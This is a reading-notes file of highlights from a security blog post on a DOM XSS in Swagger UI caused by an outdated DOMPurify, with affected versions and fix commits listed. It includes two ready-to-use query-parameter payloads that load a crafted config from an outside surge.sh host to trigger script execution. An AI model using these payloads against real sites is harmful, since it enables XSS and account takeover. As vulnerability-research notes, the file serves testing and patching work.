---
author: Dawid Moczadło
aliases:
  - Hacking Swagger-Ui - From XSS to Account Takeovers
tags:
  - readwise/articles
url: https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
date: 2024-09-08
---
# Hacking Swagger-Ui - From XSS to Account Takeovers

![rw-book-cover](https://blog.vidocsecurity.com/content/images/2022/05/cover-2.png)

## Highlights


> **Swagger UI** is a really common library used to display API specifications in a nice-looking UI used by almost every company.
> [View Highlight](https://read.readwise.io/read/01j6mtddq3275zan54090s1vcx)



> The bug that I found was a **DOM XSS,** and it turned out that there were a lot of vulnerable instances.
> [View Highlight](https://read.readwise.io/read/01j6mte269yj3qs76jq2rzjsth)



> Swagger UI versions affected with the XSS: **>=3.14.1 < 3.38.0**
> [View Highlight](https://read.readwise.io/read/01j6mtegcvwbkfndp8fepe5bya)



> Where is the bug and how does it work
>  The root cause of the DOM XSS that I have found is quite simple - an outdated library `DomPurify` (it's used for input sanitization) combined with features of the library allowed me to get DOM XSS that was controlled from query parameters.
> [View Highlight](https://read.readwise.io/read/01j6mtg4m2jgc8hntp9sq8yhpj)



> If you are lazy [^swaggerui-xss-payload]
>  You can use just add this parameter to the URL of Swagger and see if it pops an `alert`:
>  `?configUrl=https://jumpy-floor.surge.sh/test.json`
>  
>  Sometimes the payload won’t work so check this one:
>  `?url=https://jumpy-floor.surge.sh/test.yaml`
> [View Highlight](https://read.readwise.io/read/01j6mtj623gncrqzkwn7qrxb98)

[^swaggerui-xss-payload]: [Tweets From PandyaMayur](../Tweets/@pandyaMayur11%20on%20Twitter%20-%20Tweets%20From%20PandyaMayur.md#^fed406)



> Reference
>  https://github.com/cure53/DOMPurify/commit/8ab47b0a694022b396e30b7f643e28971f75f5d8
>  https://github.com/cure53/DOMPurify/commit/7719c5b28c79db124e6a344c59c46448644781c9
> [View Highlight](https://read.readwise.io/read/01j78w5x591rachq87t3rmh5ha)

